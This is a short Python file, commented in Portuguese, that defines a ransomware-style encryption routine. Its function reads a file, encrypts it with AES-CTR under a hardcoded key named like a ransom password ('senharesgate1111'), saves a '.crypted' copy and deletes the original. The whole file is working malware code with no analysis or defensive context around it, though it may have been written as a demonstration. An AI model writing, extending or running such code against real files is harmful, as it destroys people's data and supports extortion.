import os
import pyaes

def encrypt(file_name):
    ## abrir o arquivo a ser criptografado
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    ## chave de criptografia
    key = b"senharesgate1111"
    aes = pyaes.AESModeOfOperationCTR(key)

    ## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    ## salvar o arquivo criptografado
    new_file = file_name + ".crypted"
    new_file = open(f'{new_file}','wb')
    new_file.write(crypto_data)
    new_file.close()

    ## remover o arquivo
    os.remove(file_name)

    return 'encrypted!'
